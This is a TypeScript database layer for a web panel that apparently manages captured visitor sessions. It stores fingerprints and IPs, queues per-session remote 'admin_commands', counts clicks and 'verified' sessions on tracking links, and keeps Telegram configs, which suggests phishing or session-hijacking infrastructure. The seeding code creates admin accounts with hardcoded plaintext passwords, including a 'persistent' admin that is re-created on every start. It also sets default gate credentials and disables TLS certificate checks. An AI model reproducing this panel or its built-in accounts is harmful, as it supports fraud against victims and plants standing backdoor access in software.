import sqlite3 from 'sqlite3';
import { Pool } from 'pg';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import { ensureHashedPassword } from './utils/password';

// --- Configuration ---
const DATA_DIR = process.env['DATA_DIR'] || './data';
const DATABASE_URL = process.env['DATABASE_URL'];

let sqliteDb: sqlite3.Database | null = null;
let pgPool: Pool | null = null;

const isPostgres = !!DATABASE_URL;

// --- Initialization ---

export const initDB = async () => {
    if (isPostgres) {
        console.log('[DB] Connecting to PostgreSQL...');
        pgPool = new Pool({
            connectionString: DATABASE_URL,
            ssl: { rejectUnauthorized: false } // Required for most cloud providers (Render/Heroku)
        });

        try {
            await pgPool.query('SELECT 1');
            console.log('[DB] Connected to PostgreSQL.');
            await initPostgresSchema();
        } catch (e) {
            console.error('[DB] PostgreSQL Connection Error:', e);
            process.exit(1);
        }
    } else {
        // SQLite Fallback
        if (!fs.existsSync(DATA_DIR)) {
            fs.mkdirSync(DATA_DIR, { recursive: true });
        }
        const DB_PATH = path.join(DATA_DIR, 'sessions.db');
        console.log(`[DB] Initializing SQLite database at ${DB_PATH}`);

        sqliteDb = new sqlite3.Database(DB_PATH, (err) => {
            if (err) console.error('[DB] SQLite Connection Error:', err.message);
            else console.log('[DB] Connected to SQLite database.');
        });

        await initSqliteSchema();
    }
};

const seedHypervisor = async () => {
    const hyperUser = {
        id: crypto.randomUUID(),
        username: 'madrigal.sd',
        password: 'Madrigal007@', // In a real app, hash this!
        role: 'hypervisor',
        uniqueCode: 'hypervisor', // Not really used for traffic, but good to have
        settings: JSON.stringify({}),
        telegramConfig: JSON.stringify({}),
        maxLinks: 100 // Hypervisor gets more
    };

    // Check if exists first to avoid duplicates on restart
    const exists = await getUserByUsername('madrigal.sd');
    if (!exists) {
        console.log('[DB] Seeding Hypervisor...');
        await createUser(hyperUser);
        console.log('[DB] Hypervisor seeded.');
    }

    // Seed Secondary Admin (Persistent)
    const adminExists = await getUserByUsername('admin_88e3');
    if (!adminExists) {
        const adminUser = {
            id: 'f0cffa74-609d-4fd6-af54-05b4a87f78b1',
            username: 'admin_88e3',
            password: 'Pass88e3!',
            role: 'admin',
            uniqueCode: '1e7227e5',
            settings: '{}',
            telegramConfig: '{}',
            maxLinks: 1
        };
        console.log('[DB] Seeding Admin 88e3...');
        await createUser(adminUser);
    }
};

const runSqlite = (sql: string, params: any[] = []): Promise<void> => {
    return new Promise((resolve, reject) => {
        sqliteDb!.run(sql, params, (err) => {
            if (err) reject(err);
            else resolve();
        });
    });
};

const initSqliteSchema = async () => {
    if (!sqliteDb) return;

    // 1. Create Tables
    await runSqlite(`
        CREATE TABLE IF NOT EXISTS users (
            id TEXT PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT,
            role TEXT,
            uniqueCode TEXT UNIQUE,
            settings TEXT,
            telegramConfig TEXT,
            maxLinks INTEGER DEFAULT 1,
            isSuspended BOOLEAN DEFAULT 0
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            data TEXT,
            lastSeen INTEGER,
            ip TEXT,
            adminId TEXT,
            FOREIGN KEY(adminId) REFERENCES users(id)
        )
    `);

    // Indices
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_sessions_lastSeen ON sessions (lastSeen)`);
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_sessions_adminId ON sessions (adminId)`);
    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_users_username ON users (username)`);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS admin_commands (
            sessionId TEXT PRIMARY KEY,
            action TEXT,
            payload TEXT
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    `);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS admin_links (
            code TEXT PRIMARY KEY,
            adminId TEXT,
            clicks INTEGER DEFAULT 0,
            sessions_started INTEGER DEFAULT 0,
            sessions_verified INTEGER DEFAULT 0,
            created_at INTEGER,
            FOREIGN KEY(adminId) REFERENCES users(id)
        )
    `);

    await runSqlite(`CREATE INDEX IF NOT EXISTS idx_links_code ON admin_links (code)`);

    await runSqlite(`
        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp INTEGER,
            actor TEXT,
            action TEXT,
            details TEXT
        )
    `);

    // 2. Migrations (Try/Catch to ignore "duplicate column")
    try {
        await runSqlite(`ALTER TABLE users ADD COLUMN maxLinks INTEGER DEFAULT 1`);
    } catch (e: any) {
        if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (maxLinks):', e.message);
    }

    try {
        await runSqlite(`ALTER TABLE users ADD COLUMN isSuspended BOOLEAN DEFAULT 0`);
    } catch (e: any) {
         if (!e.message.includes('duplicate column')) console.error('[DB] Migration Error (isSuspended):', e.message);
    }

    // 3. Seed
    await seedHypervisor();

    // Default Settings for Gate
    try {
        const settings = await getSettings();
        if (!settings.gateUser) await updateSetting('gateUser', 'admin');
        if (!settings.gatePass) await updateSetting('gatePass', 'secure123');
    } catch (e) { console.error('Failed to seed gate settings', e); }
};

const initPostgresSchema = async () => {
    if (!pgPool) return;
    const client = await pgPool.connect();
    try {
        // Migration: Add maxLinks
        try {
            await client.query('ALTER TABLE users ADD COLUMN maxLinks INTEGER DEFAULT 1');
        } catch (e) { /* Ignore if exists */ }
        // Migration: Add isSuspended
        try {
            await client.query('ALTER TABLE users ADD COLUMN isSuspended BOOLEAN DEFAULT FALSE');
        } catch (e) { /* Ignore if exists */ }

        await client.query(`
            CREATE TABLE IF NOT EXISTS users (
                id TEXT PRIMARY KEY,
                username TEXT UNIQUE,
                password TEXT,
                role TEXT,
                uniqueCode TEXT UNIQUE,
                settings TEXT,
                telegramConfig TEXT,
                maxLinks INTEGER DEFAULT 1,
                isSuspended BOOLEAN DEFAULT FALSE
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS sessions (
                id TEXT PRIMARY KEY,
                data TEXT,
                lastSeen BIGINT,
                ip TEXT,
                adminId TEXT
            )
        `);

        await client.query(`CREATE INDEX IF NOT EXISTS idx_sessions_lastSeen ON sessions (lastSeen)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_sessions_adminId ON sessions (adminId)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_users_username ON users (username)`);
        await client.query(`CREATE INDEX IF NOT EXISTS idx_links_code ON admin_links (code)`);

        await client.query(`
            CREATE TABLE IF NOT EXISTS admin_commands (
                sessionId TEXT PRIMARY KEY,
                action TEXT,
                payload TEXT
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        `);

        // New Tables
        await client.query(`
            CREATE TABLE IF NOT EXISTS admin_links (
                code TEXT PRIMARY KEY,
                adminId TEXT,
                clicks INTEGER DEFAULT 0,
                sessions_started INTEGER DEFAULT 0,
                sessions_verified INTEGER DEFAULT 0,
                created_at BIGINT
            )
        `);

        await client.query(`
            CREATE TABLE IF NOT EXISTS audit_logs (
                id SERIAL PRIMARY KEY,
                timestamp BIGINT,
                actor TEXT,
                action TEXT,
                details TEXT
            )
        `);

        await seedHypervisor();

        // Default Settings for Gate
        const s = await getSettings();
        if (!s.gateUser) await updateSetting('gateUser', 'admin');
        if (!s.gatePass) await updateSetting('gatePass', 'secure123');

    } finally {
        client.release();
    }
};

// --- User Management ---

export const createUser = async (user: any): Promise<void> => {
    const { id, username, password, role, uniqueCode, settings, telegramConfig, maxLinks } = user;
    const links = maxLinks || (role === 'hypervisor' ? 100 : 1);
    const suspended = user.isSuspended || false;
    const hashedPassword = password ? await ensureHashedPassword(password) : password;

    if (isPostgres) {
        const query = `
            INSERT INTO users (id, username, password, role, uniqueCode, settings, telegramConfig, maxLinks, isSuspended)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
        `;
        await pgPool!.query(query, [id, username, hashedPassword, role, uniqueCode, settings, telegramConfig, links, suspended]);
    } else {
        const query = `
            INSERT INTO users (id, username, password, role, uniqueCode, settings, telegramConfig, maxLinks, isSuspended)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        `;
        await new Promise<void>((resolve, reject) => {
            sqliteDb!.run(query, [id, username, hashedPassword, role, uniqueCode, settings, telegramConfig, links, suspended], (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
    }

    try {
        await createLink(id, uniqueCode);
    } catch (e) {
        console.error('Failed to create default link', e);
    }
};

export const backfillDefaultLinks = async (): Promise<void> => {
    try {
        const users = await getAllUsers();
        for (const user of users) {
             const existing = await getLinkByCode(user.uniqueCode);
             if (!existing) {
                 console.log(`[DB] Backfilling default link for ${user.username} (${user.uniqueCode})`);
                 await createLink(user.id, user.uniqueCode);
             }
        }
    } catch (e) {
        console.error('[DB] Failed to backfill links:', e);
    }
};

export const updateUser = async (id: string, updates: any): Promise<void> => {
    const current = await getUserById(id);
    if (!current) {
        throw new Error('User not found');
    }

    const normalizedUpdates = { ...updates };
    if (normalizedUpdates.password) {
        normalizedUpdates.password = await ensureHashedPassword(normalizedUpdates.password);
    }

    const u = { ...current, ...normalizedUpdates };

    if (isPostgres) {
        const query = `
            UPDATE users SET username=$1, password=$2, role=$3, uniqueCode=$4, settings=$5, telegramConfig=$6, maxLinks=$7, isSuspended=$8
            WHERE id=$9
        `;
        await pgPool!.query(query, [u.username, u.password, u.role, u.uniqueCode, u.settings, u.telegramConfig, u.maxLinks, u.isSuspended, id]);
    } else {
        const query = `
            UPDATE users SET username=?, password=?, role=?, uniqueCode=?, settings=?, telegramConfig=?, maxLinks=?, isSuspended=?
            WHERE id=?
        `;
        await new Promise<void>((resolve, reject) => {
            sqliteDb!.run(query, [u.username, u.password, u.role, u.uniqueCode, u.settings, u.telegramConfig, u.maxLinks, u.isSuspended, id], (err) => {
                if (err) reject(err);
                else resolve();
            });
        });
    }
};

export const deleteUser = (id: string): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('DELETE FROM users WHERE id = $1', [id]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run('DELETE FROM users WHERE id = ?', [id], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const deleteLink = (code: string): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('DELETE FROM admin_links WHERE code = $1', [code]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run('DELETE FROM admin_links WHERE code = ?', [code], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const getUserById = (id: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM users WHERE id = $1', [id])
                .then(res => resolve(res.rows[0]))
                .catch(reject);
        } else {
            sqliteDb!.get('SELECT * FROM users WHERE id = ?', [id], (err, row) => {
                if (err) reject(err);
                else resolve(row);
            });
        }
    });
};

export const getUserByUsername = (username: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM users WHERE username = $1', [username])
                .then(res => resolve(res.rows[0]))
                .catch(reject);
        } else {
            sqliteDb!.get('SELECT * FROM users WHERE username = ?', [username], (err, row) => {
                if (err) reject(err);
                else resolve(row || null);
            });
        }
    });
};

export const getUserByCode = (code: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM users WHERE uniqueCode = $1', [code])
                .then(res => resolve(res.rows[0]))
                .catch(reject);
        } else {
            sqliteDb!.get('SELECT * FROM users WHERE uniqueCode = ?', [code], (err, row) => {
                if (err) reject(err);
                else resolve(row);
            });
        }
    });
};

export const getAllUsers = (): Promise<any[]> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM users')
                .then(res => resolve(res.rows))
                .catch(reject);
        } else {
            sqliteDb!.all('SELECT * FROM users', [], (err, rows) => {
                if (err) reject(err);
                else resolve(rows as any[]);
            });
        }
    });
};

// --- Links Management ---

export const createLink = (adminId: string, code: string): Promise<void> => {
    const now = Date.now();
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(`INSERT INTO admin_links (code, adminId, created_at) VALUES ($1, $2, $3)`, [code, adminId, now])
                .then(() => resolve())
                .catch(reject);
        } else {
            sqliteDb!.run(`INSERT INTO admin_links (code, adminId, created_at) VALUES (?, ?, ?)`, [code, adminId, now], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const getLinks = (adminId?: string): Promise<any[]> => {
    return new Promise((resolve, reject) => {
        let sql = 'SELECT * FROM admin_links';
        const params: any[] = [];
        // Only filter if adminId is provided AND it's not a Hypervisor view request.
        // But here we rely on the caller to pass undefined for Hypervisor.
        if (adminId) {
            sql += ' WHERE adminId = ?';
            params.push(adminId);
        }
        sql += ' ORDER BY created_at DESC';

        if (isPostgres) {
            if (adminId) sql = sql.replace('?', '$1');
            pgPool!.query(sql, params)
                .then(res => {
                    // Normalize PostgreSQL lowercase column names
                    const links = res.rows.map(row => ({
                        code: row.code,
                        adminId: row.adminid,
                        clicks: row.clicks,
                        sessions_started: row.sessions_started,
                        sessions_verified: row.sessions_verified,
                        created_at: row.created_at
                    }));
                    resolve(links);
                })
                .catch(reject);
        } else {
            sqliteDb!.all(sql, params, (err, rows: any[]) => {
                if (err) reject(err);
                else resolve(rows);
            });
        }
    });
};

export const getLinkByCode = (code: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM admin_links WHERE code = $1', [code])
                .then(res => {
                    const row = res.rows[0];
                    if (row) {
                        // Normalize PostgreSQL lowercase column names
                        resolve({
                            code: row.code,
                            adminId: row.adminid,
                            clicks: row.clicks,
                            sessions_started: row.sessions_started,
                            sessions_verified: row.sessions_verified,
                            created_at: row.created_at
                        });
                    } else {
                        resolve(null);
                    }
                })
                .catch(reject);
        } else {
            sqliteDb!.get('SELECT * FROM admin_links WHERE code = ?', [code], (err, row) => {
                if (err) reject(err);
                else resolve(row);
            });
        }
    });
};

export const incrementLinkClicks = (code: string): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('UPDATE admin_links SET clicks = clicks + 1 WHERE code = $1', [code]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run('UPDATE admin_links SET clicks = clicks + 1 WHERE code = ?', [code], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const incrementLinkSessions = (code: string, type: 'started' | 'verified'): Promise<void> => {
    const col = type === 'started' ? 'sessions_started' : 'sessions_verified';
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(`UPDATE admin_links SET ${col} = ${col} + 1 WHERE code = $1`, [code]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run(`UPDATE admin_links SET ${col} = ${col} + 1 WHERE code = ?`, [code], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

// --- Audit Logs ---

export const logAudit = (actor: string, action: string, details: string): Promise<void> => {
    const now = Date.now();
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(`INSERT INTO audit_logs (timestamp, actor, action, details) VALUES ($1, $2, $3, $4)`, [now, actor, action, details])
                .then(() => resolve())
                .catch(e => { console.error('Audit Log Error', e); resolve(); });
        } else {
            sqliteDb!.run(`INSERT INTO audit_logs (timestamp, actor, action, details) VALUES (?, ?, ?, ?)`, [now, actor, action, details], (err) => {
                if (err) console.error('Audit Log Error', err);
                resolve();
            });
        }
    });
};

export const getAuditLogs = (limit = 100): Promise<any[]> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM audit_logs ORDER BY timestamp DESC LIMIT $1', [limit])
                .then(res => resolve(res.rows))
                .catch(reject);
        } else {
            sqliteDb!.all('SELECT * FROM audit_logs ORDER BY timestamp DESC LIMIT ?', [limit], (err, rows: any[]) => {
                if (err) reject(err);
                else resolve(rows);
            });
        }
    });
};

// --- Settings ---

export const getSettings = (): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM settings')
                .then(res => {
                    const settings: any = {};
                    res.rows.forEach(r => settings[r.key] = r.value);
                    resolve(settings);
                })
                .catch(reject);
        } else {
            sqliteDb!.all('SELECT * FROM settings', [], (err, rows: any[]) => {
                if (err) return reject(err);
                const settings: any = {};
                rows.forEach(r => settings[r.key] = r.value);
                resolve(settings);
            });
        }
    });
};

export const updateSetting = (key: string, value: string): Promise<void> => {
    const query = `
        INSERT INTO settings (key, value) VALUES ($1, $2)
        ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value
    `;
    const sqliteQuery = `INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)`;

    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(query, [key, value]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run(sqliteQuery, [key, value], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

// --- Sessions ---

export const getSession = (id: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM sessions WHERE id = $1', [id])
                .then(res => {
                    const row = res.rows[0];
                    if (row) {
                        resolve({ ...JSON.parse(row.data), id: row.id, lastSeen: Number(row.lastseen), ip: row.ip, adminId: row.adminid });
                    } else {
                        resolve(null);
                    }
                })
                .catch(reject);
        } else {
            sqliteDb!.get('SELECT * FROM sessions WHERE id = ?', [id], (err, row: any) => {
                if (err) return reject(err);
                if (row) {
                    resolve({ ...JSON.parse(row.data), id: row.id, lastSeen: row.lastSeen, ip: row.ip, adminId: row.adminId });
                } else {
                    resolve(null);
                }
            });
        }
    });
};

export const getSessionsByIp = (ip: string): Promise<any[]> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('SELECT * FROM sessions WHERE ip = $1', [ip])
                .then(res => {
                    const sessions = res.rows.map(r => {
                        const data = JSON.parse(r.data);
                        return { ...data, id: r.id, lastSeen: Number(r.lastseen), ip: r.ip, adminId: r.adminid };
                    });
                    resolve(sessions);
                })
                .catch(reject);
        } else {
            sqliteDb!.all('SELECT * FROM sessions WHERE ip = ?', [ip], (err, rows: any[]) => {
                if (err) return reject(err);
                const sessions = rows.map(r => {
                    const data = JSON.parse(r.data);
                    return { ...data, id: r.id, lastSeen: r.lastSeen, ip: r.ip, adminId: r.adminId };
                });
                resolve(sessions);
            });
        }
    });
};

export const upsertSession = (id: string, data: any, ip: string, adminId: string | null = null): Promise<void> => {
    const json = JSON.stringify(data);
    const now = Date.now();

    return new Promise((resolve, reject) => {
        if (isPostgres) {
            const query = `
                INSERT INTO sessions (id, data, lastSeen, ip, adminId)
                VALUES ($1, $2, $3, $4, $5)
                ON CONFLICT(id) DO UPDATE SET
                data = EXCLUDED.data,
                lastSeen = EXCLUDED.lastSeen,
                ip = EXCLUDED.ip,
                adminId = COALESCE($5, sessions.adminId)
            `;
            pgPool!.query(query, [id, json, now, ip, adminId]).then(() => resolve()).catch(reject);
        } else {
             const query = `
                INSERT INTO sessions (id, data, lastSeen, ip, adminId)
                VALUES (?, ?, ?, ?, ?)
                ON CONFLICT(id) DO UPDATE SET
                data = excluded.data,
                lastSeen = excluded.lastSeen,
                ip = excluded.ip,
                adminId = COALESCE(?, sessions.adminId)
            `;
            sqliteDb!.run(query, [id, json, now, ip, adminId, adminId], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const updateSessionAdmin = (sessionId: string, adminId: string | null): Promise<void> => {
     return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('UPDATE sessions SET adminId = $1 WHERE id = $2', [adminId, sessionId])
                .then(() => resolve())
                .catch(reject);
        } else {
            sqliteDb!.run('UPDATE sessions SET adminId = ? WHERE id = ?', [adminId, sessionId], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
     });
}

export const updateLastSeen = (id: string, lastSeen: number): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('UPDATE sessions SET lastSeen = $1 WHERE id = $2', [lastSeen, id])
                .then(() => resolve())
                .catch(reject);
        } else {
            sqliteDb!.run('UPDATE sessions SET lastSeen = ? WHERE id = ?', [lastSeen, id], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const getAllSessions = (adminId?: string, role?: string): Promise<any[]> => {
    return new Promise((resolve, reject) => {
        let sql = 'SELECT * FROM sessions ';
        const params: any[] = [];

        // Logic:
        // Admin: WHERE adminId = ?
        // Hypervisor: WHERE adminId = ? OR adminId IS NULL (Own sessions + Unassigned)
        // If adminId is missing, assume Unassigned only? Or keep legacy "All"?
        // The API layer will now always pass adminId and role.

        if (adminId) {
            if (role === 'hypervisor') {
                sql += 'WHERE (adminId = ? OR adminId IS NULL) ';
                params.push(adminId);
            } else {
                sql += 'WHERE adminId = ? ';
                params.push(adminId);
            }
        }

        sql += 'ORDER BY lastSeen DESC';

        if (isPostgres) {
            // Replace ? with $1
            if (params.length > 0) sql = sql.replace('?', '$1');

            pgPool!.query(sql, params)
                .then(res => {
                    const sessions = res.rows.map(r => {
                        const data = JSON.parse(r.data);
                        if (!data.fingerprint) data.fingerprint = {};
                        data.fingerprint.ip = r.ip;
                        return {
                            ...data,
                            id: r.id,
                            lastSeen: Number(r.lastseen),
                            ip: r.ip,
                            adminId: r.adminid
                        };
                    });
                    resolve(sessions);
                })
                .catch(reject);
        } else {
            sqliteDb!.all(sql, params, (err, rows: any[]) => {
                if (err) return reject(err);
                const sessions = rows.map(r => {
                    const data = JSON.parse(r.data);
                    if (!data.fingerprint) data.fingerprint = {};
                    data.fingerprint.ip = r.ip;
                    return {
                        ...data,
                        id: r.id,
                        lastSeen: r.lastSeen,
                        ip: r.ip,
                        adminId: r.adminId
                    };
                });
                resolve(sessions);
            });
        }
    });
};

export const deleteSession = (id: string): Promise<void> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query('DELETE FROM sessions WHERE id = $1', [id]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run('DELETE FROM sessions WHERE id = ?', [id], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const queueCommand = (sessionId: string, action: string, payload: any): Promise<void> => {
    const json = JSON.stringify(payload);

    // Postgres Syntax
    const pgQuery = `
        INSERT INTO admin_commands (sessionId, action, payload) VALUES ($1, $2, $3)
        ON CONFLICT (sessionId) DO UPDATE SET action = EXCLUDED.action, payload = EXCLUDED.payload
    `;

    // SQLite Syntax
    const sqliteQuery = `INSERT OR REPLACE INTO admin_commands (sessionId, action, payload) VALUES (?, ?, ?)`;

    return new Promise((resolve, reject) => {
        if (isPostgres) {
            pgPool!.query(pgQuery, [sessionId, action, json]).then(() => resolve()).catch(reject);
        } else {
            sqliteDb!.run(sqliteQuery, [sessionId, action, json], (err) => {
                if (err) reject(err);
                else resolve();
            });
        }
    });
};

export const getCommand = (sessionId: string): Promise<any> => {
    return new Promise((resolve, reject) => {
        if (isPostgres) {
            // Postgres supports RETURNING on DELETE, which allows atomic pop
            pgPool!.query('DELETE FROM admin_commands WHERE sessionId = $1 RETURNING *', [sessionId])
                .then(res => {
                    if (res.rows.length > 0) {
                        const row = res.rows[0];
                        resolve({ action: row.action, payload: JSON.parse(row.payload) });
                    } else {
                        resolve(null);
                    }
                })
                .catch(reject);
        } else {
            // SQLite: Read then Delete (Not strictly atomic but fine for this low concurrency)
            sqliteDb!.get('SELECT * FROM admin_commands WHERE sessionId = ?', [sessionId], (err, row: any) => {
                if (err) return reject(err);
                if (row) {
                    sqliteDb!.run('DELETE FROM admin_commands WHERE sessionId = ?', [sessionId]);
                    resolve({ action: row.action, payload: JSON.parse(row.payload) });
                } else {
                    resolve(null);
                }
            });
        }
    });
};

export default {
    initDB,
    getSettings,
    updateSetting,
    getSession,
    getSessionsByIp,
    upsertSession,
    updateSessionAdmin,
    updateLastSeen,
    getAllSessions,
    deleteSession,
    queueCommand,
    getCommand,
    // Users
    createUser,
    updateUser,
    deleteUser,
    getUserById,
    getUserByUsername,
    getUserByCode,
    getAllUsers,
    // Links
    createLink,
    getLinks,
    getLinkByCode,
    incrementLinkClicks,
    incrementLinkSessions,
    // Audit
    logAudit,
    getAuditLogs,
    backfillDefaultLinks,
    deleteLink
};
